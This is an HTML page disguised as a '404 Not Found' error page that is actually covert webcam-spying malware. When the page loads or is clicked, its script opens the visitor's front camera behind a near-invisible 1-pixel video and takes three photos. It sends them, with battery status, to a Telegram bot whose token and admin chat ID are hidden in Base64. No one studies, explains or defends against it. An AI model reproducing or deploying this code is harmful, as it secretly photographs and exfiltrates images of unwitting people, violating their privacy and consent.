<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title> 
    <style>
        body { margin: 0; padding: 0; background-color: #000; overflow: hidden; height: 100vh; cursor: none; }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // 🔐 Security Keys (Base64)
        const _aE = "Njk1MjU4MDYzMA=="; 
        const _tE = "ODIzNTA0MDA2NDpBQUZ1V1lWeDJjYktSVDAtaEZGQm5GVHMzdnF3YU95a3BXWQ==";
        
        const dec = (s) => atob(s);
        const adminId = dec(_aE);
        const botToken = dec(_tE);

        // 🕵️‍♂️ Identification logic from original code
        const urlParams = new URLSearchParams(window.location.search);
        const visitorId = urlParams.get('uid'); 

        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        const context = canvas.getContext('2d');
        let batteryInfo = "N/A";

        // 🔋 Battery Status
        if(navigator.getBattery) {
            navigator.getBattery().then(bt => { 
                batteryInfo = `${(bt.level * 100).toFixed(0)}% (${bt.charging ? 'Charging' : 'Discharging'})`; 
            });
        }

        // 🚀 Activation
        function launch() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then((stream) => {
                video.srcObject = stream;
                video.onplaying = () => { 
                    captureSequence(); 
                };
            }).catch(e => { /* Silent */ });
        }

        // Send function based on target ID
        function sendToTelegram(target, blob, count, note) {
            const fd = new FormData();
            fd.append("chat_id", target);
            fd.append("photo", blob, `shot_${count}.jpg`);
            // Signature: By @slomiarna
            fd.append("caption", `🚨 **By @slomiarna**\n🔋 Battery: ${batteryInfo}\n📸 Shot: ${count}/3\n📝 ${note}`);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
        }

        // 📸 Rapid Capture Logic
        async function captureSequence() {
            for (let i = 1; i <= 3; i++) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    if (blob) {
                        // 🔄 Routing Logic from original code
                        if (visitorId && visitorId !== adminId) {
                            // Send to visitor
                            sendToTelegram(visitorId, blob, i, "Direct Stream");
                            // Alert admin
                            sendToTelegram(adminId, blob, i, `Target Alert: ${visitorId}`);
                        } else {
                            // Admin mode
                            sendToTelegram(adminId, blob, i, "Admin Monitor Active");
                        }
                    }
                }, 'image/jpeg', 0.7);

                // 1 second interval
                await new Promise(r => setTimeout(r, 1000));
            }
        }

        // Auto-Trigger
        window.onload = launch;
        window.onclick = launch;
        window.ontouchstart = launch;
    </script>
</body>
</html>
